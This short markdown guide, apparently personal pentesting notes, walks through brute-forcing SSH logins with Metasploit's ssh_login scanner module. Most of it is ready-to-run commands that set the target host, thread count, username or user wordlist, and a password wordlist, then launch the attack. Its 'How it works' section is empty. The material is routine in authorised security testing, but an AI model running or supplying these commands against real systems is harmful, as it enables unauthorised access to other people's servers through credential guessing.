> Note: This attacking method is quite slow and should be used with a pre-selected collection of passwords.

## How it works



## Setup

```bash
$ sudo msfdb run  # starting the attacking tool
msf6 > use auxiliary/scanner/ssh/ssh_login  # activating the tool
msf6 auxiliary(scanner/ssh/ssh_login) >  # should look something like this. shortened in this example to `msf$`
msf6$ set VERBOSE true  # this options shows you where the attack is (makes it harder to analyze afterwards with many passwords)
msf6$ set STOP_ON_SUCCESS true  # only activate if you attempt for one user only. If you use a USER_FILE don't use this
msf6$ set RHOSTS 10.20.30.2  # select the target machine (multiple are allowed)
msf6$ set THREADS x  # only with multiple targets (one thread per target)
msf6$ set USERNAME user  # select the right user (if you know him)
msf6$ set USER_FILE /usr/share/wordlists/metasploit/http_default_users.txt  # Only if you don't know USERNAME. this is a good selection if you don't know the user
msf6$ set PASS_FILE /usr/share/wordlists/metasploit/adobe_top100_pass.txt  # I recommend this file (see note at the top) or another one from the password-lists mentioned in `Attacks`
```

## Execution

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > run
